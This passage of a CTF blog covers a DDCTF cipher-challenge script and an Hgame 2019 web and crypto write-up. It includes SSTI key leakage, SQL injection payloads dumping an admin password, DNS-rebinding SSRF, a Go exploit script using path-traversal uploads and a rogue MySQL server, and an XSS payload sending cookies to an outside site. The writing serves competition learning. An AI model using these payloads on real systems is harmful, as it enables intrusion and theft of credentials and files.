s)</span>:</span></span><br><span class="line">        bits = self.string_to_bits_list(s)</span><br><span class="line">        dec = [self.decrypt_bits(b) <span class="keyword">for</span> b <span class="keyword">in</span> bits]</span><br><span class="line">        <span class="keyword">return</span> self.unpad_string(self.bits_list_to_string(dec))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    DIFFERENTECH Cipher</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    As you are monitoring your station, you intercepted a hex-encoded encrypted</span></span><br><span class="line"><span class="string">    message, along with its plain text.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    plaintext = "Cryptanalysis has coevolved together with cryptography"</span></span><br><span class="line"><span class="string">    ciphertext = ("2371697013e9bdcb50133102f2c8c08a69b93e1878ac7939ac7049"</span></span><br><span class="line"><span class="string">                  "8ddd5dee019f4be4ec8dd3a612c8708a1169701d5d3de3169c7b1d"</span></span><br><span class="line"><span class="string">                  "146146146146").decode('hex')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    You have also previously chanced upon another encrypted message, which you</span></span><br><span class="line"><span class="string">    will need to decrypt.  Taking a look at the algorithm, and past interceptions,</span></span><br><span class="line"><span class="string">    you noticed that the 12-bit numbers:</span></span><br><span class="line"><span class="string">        2684 encrypts to 2568</span></span><br><span class="line"><span class="string">        3599 encrypts to 3185</span></span><br><span class="line"><span class="string">    You realize that you just might be able to break it before lunch!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NOTE: GIVE ONE ENCRYPTED FLAG AS PART OF THE QUESTIION AND Try to decrypt</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># find the right SECRET_KEYS</span></span><br><span class="line">    SECRET_KEYS = [<span class="number">3488</span>, <span class="number">2863</span>, <span class="number">726</span>, <span class="number">1886</span>]</span><br><span class="line">    cipher = Cipher(*SECRET_KEYS)</span><br><span class="line"></span><br><span class="line">    test_text = <span class="string">"DDCTF&#123;"</span></span><br><span class="line">    ciphertext = (<span class="string">"8ed251b186927f62521fa81348782ecd781957571b69749b3e1515901e4e7065a6e949174472fdf01dcf"</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="comment">#test_text = "Cryptanalysis has coevolved together with cryptography"</span></span><br><span class="line">    <span class="comment">#ciphertext = ("2371697013e9bdcb50133102f2c8c08a69b93e1878ac7939ac7049"</span></span><br><span class="line">    <span class="comment">#              "8ddd5dee019f4be4ec8dd3a612c8708a1169701d5d3de3169c7b1d"</span></span><br><span class="line">    <span class="comment">#              "146146146146").decode('hex')</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'==='</span></span><br><span class="line">    bits = cipher.string_to_bits_list(test_text)</span><br><span class="line">    <span class="keyword">print</span> len(bits)</span><br><span class="line">    <span class="keyword">print</span> bits</span><br><span class="line">    <span class="comment"># print cipher.encrypt_bits(1344)</span></span><br><span class="line">    <span class="comment"># print ciphertext</span></span><br><span class="line">    bits = cipher.string_to_bits_list(ciphertext)</span><br><span class="line">    <span class="keyword">print</span> bits</span><br><span class="line"></span><br><span class="line">    dec = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bits:</span><br><span class="line">        dec.append(cipher.decrypt_bits(i))</span><br><span class="line">    <span class="keyword">print</span> dec</span><br><span class="line">    <span class="keyword">print</span> cipher.bits_list_to_string(dec)</span><br><span class="line">    <span class="keyword">print</span> len(bits)</span><br><span class="line">    <span class="comment"># 8ed251b186927f62521fa81348782ecd781957571b69749b3e1515901e4e7065a6e949174472fdf01dcf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># enc = cipher.encrypt(test_text)</span></span><br><span class="line">    dec = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> test_text == dec:</span><br><span class="line">        print(<span class="string">"That's right!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Try again!"</span>)</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>web</tag>
        <tag>ddctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Hgame Writeup</title>
    <url>/2019/03/09/Hgame-Writeup/</url>
    <content><![CDATA[<h2 id="happyPython"><a href="#happyPython" class="headerlink" title="happyPython"></a>happyPython</h2><p>随便 fuzz 一下发现 404 页面有模板注入, <a href="http://118.25.18.223:3001/asd%7B%7Bconfig%7D%7D" target="_blank" rel="noopener">http://118.25.18.223:3001/asd%7B%7Bconfig%7D%7D</a>.<br>拿到 <code>&#39;SECRET_KEY&#39;: &#39;9RxdzNwq7!nOoK3*&#39;</code>, 把 session 里的 user_id 改成 <code>1</code> 就行了.<br><img src="https://i.loli.net/2019/03/21/5c93a6120d105.png" alt=""><br><img src="https://i.loli.net/2019/03/21/5c93a611dc09d.png" alt=""></p>
<a id="more"></a>

<h2 id="happyPHP"><a href="#happyPHP" class="headerlink" title="happyPHP"></a>happyPHP</h2><p><code>users</code> 页面有源码泄露, <code>https://github.com/Lou00/laravel</code>.<br>审计源码发现 <code>SessionsController.php</code> 直接拼接 sql 语句, 存在注入.  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionsController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">store</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $credentials = <span class="keyword">$this</span>-&gt;validate($request, [</span><br><span class="line">            <span class="string">'email'</span> =&gt; <span class="string">'required|email|max:100'</span>,</span><br><span class="line">            <span class="string">'password'</span> =&gt; <span class="string">'required'</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">if</span> (Auth::attempt($credentials)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Auth::user()-&gt;id ===<span class="number">1</span>)&#123;</span><br><span class="line">                session()-&gt;flash(<span class="string">'info'</span>,<span class="string">'flag :******'</span>);</span><br><span class="line">                <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $name = DB::select(<span class="string">"SELECT name FROM `users` WHERE `name`='"</span>.Auth::user()-&gt;name.<span class="string">"'"</span>);</span><br><span class="line">            session()-&gt;flash(<span class="string">'info'</span>, <span class="string">'hello '</span>.$name[<span class="number">0</span>]-&gt;name);</span><br><span class="line">            <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            session()-&gt;flash(<span class="string">'danger'</span>, <span class="string">'sorry,login failed'</span>);</span><br><span class="line">            <span class="keyword">return</span> redirect()-&gt;back()-&gt;withInput();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Auth::logout();</span><br><span class="line">        session()-&gt;flash(<span class="string">'success'</span>, <span class="string">'logout success'</span>);</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'login'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注册名称为 <code>123&#39; union select password from users where id =1#</code>,<br>就可以拿到管理员的加密过的密码  </p>
<p><img src="https://i.loli.net/2019/03/21/5c93a611b6a32.png" alt=""><br><img src="https://i.loli.net/2019/03/21/5c93a63b613bd.png" alt="">  </p>
<p>同理  <code>123&#39; union select email from users where id =1#</code><br>拿到 email <code>admin@hgame.com</code>  </p>
<p>config/app.php 可以找到加密方式 <code>&#39;cipher&#39; =&gt; &#39;AES-256-CBC&#39;</code>,<br>秘钥来自环境变量 <code>env(&#39;APP_KEY&#39;)</code>,<br>查找 git 的记录, 发现被删掉的 <code>.env</code><br><code>APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=</code>,<br>用这个来解密就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; echo openssl_decrypt(&quot;EaR\&#x2F;4fldOGP1G\&#x2F;aDK8e8u1Aldmxl+yB3s+kBAaoPods&#x3D;&quot;,&#39;AES-256-CBC&#39;,base64_decode(&#39;9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ&#x3D;&#39;),0,base64_decode(&#39;rnVrqfCvfJgnvSTi9z7KLw&#x3D;&#x3D;&#39;));</span><br><span class="line">s:16:&quot;9pqfPIer0Ir9UUfR&quot;;</span><br></pre></td></tr></table></figure>

<p>登录后就是 flag~</p>
<h2 id="happyJava"><a href="#happyJava" class="headerlink" title="happyJava"></a>happyJava</h2><p>这题有点坑 233, 提示放出来才做出来.<br>提示: <code>spring-boot-actuator</code><br>查了一下, fuzz /monitor /actuator 等等都没有,<br>随缘扫了一下端口找到 <code>9876</code> 端口开着 http, 竟然正是这个 spring-boot-actuator<br>访问 <code>http://119.28.26.122:9876/mappings</code> 就可以拿到所有的路由  </p>
<p><img src="https://i.loli.net/2019/03/21/5c93a6119f52e.png" alt=""></p>
<p>题目是这两个 <code>/you_will_never_find_this_interface</code>, <code>/secret_flag_here</code>,<br>看了一下是 SSRF, 试了一会发现 DNS 请求会请求两次, 可以采用 DNS Rebinding,<br>因为后面可以拿 Shell 下题目, 我就直接给大家看题目源码了  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(path=&#123;<span class="string">"/you_will_never_find_this_interface"</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">YouWillNeverFindThisInterface</span><span class="params">(@RequestParam(value=<span class="string">"url"</span>, defaultValue=<span class="string">""</span>)</span> String url)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (url.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"`url` cant be empty!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">    </span><br><span class="line">    String domain = u.getHost();</span><br><span class="line">    String ip = InetAddress.getByName(domain).getHostAddress();</span><br><span class="line">    <span class="keyword">if</span> (ip.equals(<span class="string">"127.0.0.1"</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Dont be evil. Dont request 127.0.0.1."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    URLConnection connection = u.openConnection();</span><br><span class="line">    connection.setConnectTimeout(<span class="number">5000</span>);</span><br><span class="line">    connection.setReadTimeout(<span class="number">5000</span>);</span><br><span class="line">    BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(connection.getInputStream()));</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    String current;</span><br><span class="line">    <span class="keyword">while</span> ((current = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        sb.append(current);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"emmmmmmm, something went wrong: "</span> + e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意 <code>String ip = InetAddress.getByName(domain).getHostAddress();</code> 和 <code>URLConnection connection = u.openConnection();</code>.<br>在拿到 ip 以后, 是直接再用原来的链接打开, 而不是通过 ip 访问. 也就是说, 这里其实解析了两次域名 (如果没有缓存的话, 这个下面说)<br>这给我们了机会来绕过检测, 我们只要让 DNS 第一次返回一个不是 127.0.0.1 的地址, 第二次再返回 127.0.0.1 即可. 这样 u.openConnection 将会链接 127.0.0.1, 实现 SSRF.<br>可以直接在 Github 上找到已有的<a href="https://github.com/Crypt0s/FakeDns" target="_blank" rel="noopener">项目</a>, 试了一下还是不错的. 不过在这个题目下使用有点小问题, 题目这里设置的 DNS 服务器是 8.8.8.8, 而 8.8.8.8 在递归的时候请求了一个不支持的类型 \x00\xff, 查了一下 RFC, 是这个  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3.2.3. QTYPE values</span><br><span class="line">QTYPE fields appear in the question part of a query.  QTYPES are a</span><br><span class="line">superset of TYPEs, hence all TYPEs are valid QTYPEs.  In addition, the</span><br><span class="line">following QTYPEs are defined:</span><br><span class="line">AXFR            252 A request for a transfer of an entire zone</span><br><span class="line">MAILB           253 A request for mailbox-related records (MB, MG or MR)</span><br><span class="line">MAILA           254 A request for mail agent RRs (Obsolete - see MX)</span><br><span class="line">*               255 A request for all records</span><br></pre></td></tr></table></figure>

<p>请求所有记录, 还好不是什么奇葩的, 我们稍微修改一下, 正常返回 A 记录即可.  </p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">@@ -52,7 +53,8 @@ </span><br><span class="line">TYPE = &#123;</span><br><span class="line">     "\x00\x0c": "PTR",</span><br><span class="line">     "\x00\x10": "TXT",</span><br><span class="line">     "\x00\x0f": "MX",</span><br><span class="line"><span class="deletion">-    "\x00\x06": "SOA"</span></span><br><span class="line"><span class="addition">+    "\x00\x06": "SOA",</span></span><br><span class="line"><span class="addition">+    "\x00\xff": "A"</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> # Stolen:</span><br><span class="line">@@ -346,6 +348,7 @@ </span><br><span class="line">CASE = &#123;</span><br><span class="line">     "\x00\x0c": PTR,</span><br><span class="line">     "\x00\x10": TXT,</span><br><span class="line">     "\x00\x06": SOA,</span><br><span class="line"><span class="addition">+    "\x00\xff": A,</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>然后设置 conf  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat dns.conf</span><br><span class="line">A .* 1.1.1.1,127.0.0.1</span><br></pre></td></tr></table></figure>

<p>就可以啦, 这样第一次请求返回 <code>1.1.1.1</code>, 第二次 <code>127.0.0.1</code>, 绕过了检测.<br>再说说缓存, 为了加快请求速度, 现在的操作系统都会将上次请求保存下来, 在一段时间内都会使用第一次请求的结果. 所以这种方式也有对应的局限. 我们可以看看题目的设置  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HappyjavaApplication</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Security.setProperty(<span class="string">"networkaddress.cache.negative.ttl"</span>, <span class="string">"0"</span>);</span><br><span class="line">    Security.setProperty(<span class="string">"networkaddress.cache.ttl"</span>, <span class="string">"0"</span>);</span><br><span class="line">    System.setProperty(<span class="string">"sun.net.spi.nameservice.nameservers"</span>, <span class="string">"8.8.8.8"</span>);</span><br><span class="line">    System.setProperty(<span class="string">"sun.net.spi.nameservice.provider.1"</span>, <span class="string">"dns,sun"</span>);</span><br><span class="line">    SpringApplication.run(HappyjavaApplication.class, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是将 <code>networkaddress.cache.ttl</code> 设到了 0, 相当于关闭了缓存, 所以才能这么玩 233  </p>
<p>接下来访问 <code>/secret_flag_here</code>, 是个解析 json 的界面, 当时目测就是 fastjsonRCE, 挺久之前的洞了, 网上有很多文章, 这里就不多说了. 需要注意一下 URL 需要二次编码以及题目限制了 <code>TemplatesImpl</code> 的使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(path=&#123;<span class="string">"/secret_flag_here"</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">SecretFlagHere</span><span class="params">(@RequestParam(value=<span class="string">"data"</span>, defaultValue=<span class="string">""</span>)</span> String data, HttpServletRequest request)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    String ip = request.getRemoteAddr();</span><br><span class="line">    <span class="keyword">if</span> (!ip.equals(<span class="string">"127.0.0.1"</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"This is danger interface, only allow request from 127.0.0.1!&lt;br/&gt;Your IP:"</span> + ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (data.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"data cant be empty!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((data.contains(<span class="string">"TemplatesImpl"</span>)) &amp;&amp; (data.contains(<span class="string">"@type"</span>))) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"Evil hacker?"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      object = JSON.parse(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e)</span><br><span class="line">    &#123;</span><br><span class="line">      Object object;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"Invalid JSON string!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Object object;</span><br><span class="line">    String result = <span class="string">"WoW! Convert JSON to object...OK!"</span>;</span><br><span class="line">    result = result + <span class="string">"&lt;br&gt;Result: "</span> + object.toString();</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="happyGo"><a href="#happyGo" class="headerlink" title="happyGo"></a>happyGo</h2><p>继续代码审计 233<br>题目说 flag 在 /flag, 而看了一圈并没有任意文件读取之类的.<br>但是这里注意到 <code>model.go</code> 中的 <code>orm.RegisterDataBase(&quot;default&quot;, &quot;mysql&quot;, fmt.Sprintf(&quot;%s:%s@tcp(%s:%s)/%s?allowAllFiles=true&quot;, username, password, host, port, database))</code><br>中的 <code>allowAllFiles=true</code>, 这允许我们 <code>LOAD LOCAL FILE</code>, 这里就要谈到一种攻击方式,  大家可以看<a href="http://aq.mk/index.php/archives/23/" target="_blank" rel="noopener">这里</a><br>接下来就要想办法覆盖掉配置文件, 让服务端连接我们的恶意服务器  </p>
<p>第一个漏洞点在 <code>userinfo.go</code>,  </p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c.SaveToFile(<span class="string">"uploadname"</span>, <span class="string">"static/uploads/"</span> + h.Filename)</span><br><span class="line"></span><br><span class="line">o := orm.NewOrm()</span><br><span class="line">u := models.Users&#123;Id: uid.(<span class="keyword">int</span>)&#125;</span><br><span class="line"></span><br><span class="line">err = o.Read(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    c.Abort(<span class="string">"500"</span>)</span><br><span class="line">&#125;</span><br><span class="line">u.Avatar = <span class="string">"/static/uploads/"</span> + h.Filename</span><br><span class="line">_, err = o.Update(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    c.Abort(<span class="string">"500"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.Redirect(<span class="string">"/userinfo"</span>, http.StatusFound)</span><br></pre></td></tr></table></figure>

<p>这里 Filename 没有过滤就直接拼接上去, 导致可以任意文件上传,<br>将位置设到 session 保存的目录底下, 就可以伪造 session 拿到管理员权限. (不了解的同学可以去了解一下 gogs 的 RCE)<br>PS. 这里直接覆盖 app.conf 没有用… 估计服务端的源码另外修改过  </p>
<p>而且管理员在删除用户时会直接删掉这个头像文件,  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if user.Avatar !&#x3D; &quot;&#x2F;static&#x2F;img&#x2F;avatar.jpg&quot; &#123;</span><br><span class="line">    fmt.Println(user.Avatar)</span><br><span class="line">    err :&#x3D; os.Remove(user.Avatar[1:])</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我的方法是再建一个用户, 将头像设成 app.conf 所在路径, 用管理员权限的 session 删掉这个用户, 这时配置文件将会被删除.<br>再去访问 <code>/install</code>, 就可以把我们的配置文件写进去了.  </p>
<p>因为 5min 就重置一次, 我就写了个脚本  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SERVER = <span class="string">"http://94.191.10.201:7000"</span></span><br><span class="line"><span class="comment"># http://94.191.10.201:7000</span></span><br><span class="line"><span class="comment"># http://127.0.0.1:9999</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    sess = requests.session()</span><br><span class="line">    sess.get(<span class="string">f"<span class="subst">&#123;SERVER&#125;</span>/auth"</span>)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: username,</span><br><span class="line">        <span class="string">"password"</span>: password,</span><br><span class="line">        <span class="string">"confirmpass"</span>: password,</span><br><span class="line">    &#125;</span><br><span class="line">    sess.post(<span class="string">f"<span class="subst">&#123;SERVER&#125;</span>/auth/register"</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(sess, username, password)</span>:</span></span><br><span class="line">    sess.get(<span class="string">f"<span class="subst">&#123;SERVER&#125;</span>/auth"</span>)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: username,</span><br><span class="line">        <span class="string">"password"</span>: password,</span><br><span class="line">    &#125;</span><br><span class="line">    sess.post(<span class="string">f"<span class="subst">&#123;SERVER&#125;</span>/auth/login"</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adminUsername = <span class="string">""</span>.join(random.choices(string.ascii_letters, k=<span class="number">10</span>))</span><br><span class="line">adminPassword = <span class="string">"rmb1222"</span></span><br><span class="line">adminSess = requests.session()</span><br><span class="line">register(adminUsername, adminPassword)</span><br><span class="line">login(adminSess, adminUsername, adminPassword)</span><br><span class="line"></span><br><span class="line">sessPath = adminSess.cookies[<span class="string">"PHPSESSID"</span>]</span><br><span class="line">newAvatar = <span class="string">f"../../tmp/<span class="subst">&#123;sessPath[<span class="number">0</span>]&#125;</span>/<span class="subst">&#123;sessPath[<span class="number">1</span>]&#125;</span>/<span class="subst">&#123;sessPath[<span class="number">0</span>:<span class="number">3</span>]&#125;</span>cb478171476a1dbcec5ffdef658c4"</span></span><br><span class="line"></span><br><span class="line">file = &#123;<span class="string">'uploadname'</span>: (newAvatar, open(<span class="string">'test.png'</span>, <span class="string">'rb'</span>))&#125;</span><br><span class="line">adminSess.post(<span class="string">f"<span class="subst">&#123;SERVER&#125;</span>/userinfo"</span>, files=file) </span><br><span class="line"></span><br><span class="line">adminSess.cookies[<span class="string">"PHPSESSID"</span>] = <span class="string">f"<span class="subst">&#123;sessPath[<span class="number">0</span>:<span class="number">3</span>]&#125;</span>cb478171476a1dbcec5ffdef658c4"</span>  <span class="comment"># now you are admin</span></span><br><span class="line">print(adminUsername)</span><br><span class="line">print(newAvatar)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------</span></span><br><span class="line">dummyUsername = <span class="string">""</span>.join(random.choices(string.ascii_letters, k=<span class="number">10</span>))</span><br><span class="line">dummyPassword = <span class="string">"rmb1222"</span></span><br><span class="line">dummySess = requests.session()</span><br><span class="line">register(dummyUsername, dummyPassword)</span><br><span class="line">login(dummySess, dummyUsername, dummyPassword)</span><br><span class="line"></span><br><span class="line">newAvatar = <span class="string">"../../conf/app.conf"</span></span><br><span class="line">file = &#123;<span class="string">'uploadname'</span>: (newAvatar, open(<span class="string">'temp'</span>, <span class="string">'rb'</span>))&#125;</span><br><span class="line">dummySess.post(<span class="string">f"<span class="subst">&#123;SERVER&#125;</span>/userinfo"</span>, files=file)</span><br><span class="line">print(dummyUsername)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------</span></span><br><span class="line">res = adminSess.get(<span class="string">f"<span class="subst">&#123;SERVER&#125;</span>/admin"</span>)</span><br><span class="line">reg = <span class="string">fr"<span class="subst">&#123;dummyUsername&#125;</span> \(UID: ([0-9]<span class="subst">&#123;&#123;<span class="number">0</span>,&#125;</span>&#125;)\)"</span></span><br><span class="line">uid = re.findall(reg, res.text)</span><br><span class="line">print(uid)</span><br><span class="line">uid = uid[<span class="number">0</span>]</span><br><span class="line">adminSess.get(<span class="string">f"<span class="subst">&#123;SERVER&#125;</span>/admin/user/del/<span class="subst">&#123;uid&#125;</span>"</span>) <span class="comment"># delete app.conf</span></span><br><span class="line"><span class="comment"># ------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------ overwirte it</span></span><br><span class="line">res = adminSess.get(<span class="string">f"<span class="subst">&#123;SERVER&#125;</span>/install"</span>)</span><br><span class="line">print(res.text)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"host"</span>: <span class="string">"your server ip"</span>,</span><br><span class="line">    <span class="string">"port"</span>: <span class="string">"port"</span>,</span><br><span class="line">    <span class="string">"username"</span>: <span class="string">"root"</span>,</span><br><span class="line">    <span class="string">"password"</span>: <span class="string">"rmb122"</span>,</span><br><span class="line">    <span class="string">"database"</span>: <span class="string">"123"</span>,</span><br><span class="line">&#125;</span><br><span class="line">adminSess.post(<span class="string">f"<span class="subst">&#123;SERVER&#125;</span>/install"</span>, data=data)</span><br><span class="line"></span><br><span class="line">register(<span class="string">"123123123"</span>, <span class="string">"1231231231"</span>)</span><br></pre></td></tr></table></figure>

<p>然后就守株待兔吧 233<br><img src="https://i.loli.net/2019/03/21/5c93a61185745.png" alt=""></p>
<h2 id="HappyXss"><a href="#HappyXss" class="headerlink" title="HappyXss"></a>HappyXss</h2><p>这个算是比较简单的了, 直接用 <code>&lt;iframe src=javascript:alert(&#39;xss&#39;);&gt;&lt;/iframe&gt;</code> 就可以绕了<br>不过需要注意下 CSP, <code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; style-src *</code><br>用 <code>&lt;img src=&#39;&#39;&gt;</code> 的方式来拿 cookie 是不行了, 但是注意 <code>style-src *</code>,<br>可以通过 css 来拿 cookie, payload 这样  </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; css=<span class="built_in">document</span>.createElement(<span class="string">"link"</span>);css.setAttribute(<span class="string">"rel"</span>,<span class="string">"stylesheet"</span>);css.setAttribute(<span class="string">"href"</span>,<span class="string">"yoursite?a="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie));<span class="built_in">document</span>.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>].appendChild(css);&#125;())</span><br></pre></td></tr></table></figure>


<h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h2><p>共模攻击, 不过这里 e1, e2 不互质, 3 == gcd(e1, e2), 我们先把 e1, e2 都除以 3<br>然后把除以三以后的 e1, e2 丢到脚本里跑, 把结果开三次方就可以了</p>
<h2 id="Sign-in-SemiHard"><a href="#Sign-in-SemiHard" class="headerlink" title="Sign_in_SemiHard"></a>Sign_in_SemiHard</h2><p>哈希长度拓展 + CBC 字节翻转, 直接上脚本吧, 不多说了<br>因为时间有限所以有很多地方实现的很暴力, 233</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> remoteCLI</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">BLOCK_LENGTH = <span class="number">16</span></span><br><span class="line">ZEROS = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)])</span><br><span class="line">regToken = <span class="string">r'Your token is: ([0-9A-Za-z]&#123;0,&#125;)'</span></span><br><span class="line">regUsername = <span class="string">r'Sorry, your username\(hex\) ([0-9A-Za-z]&#123;0,&#125;) is inconsistent with given signature\.'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    result = bytearray()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        result.append(a[i] ^ b[i])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unprintable = <span class="string">b""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> chr(i) <span 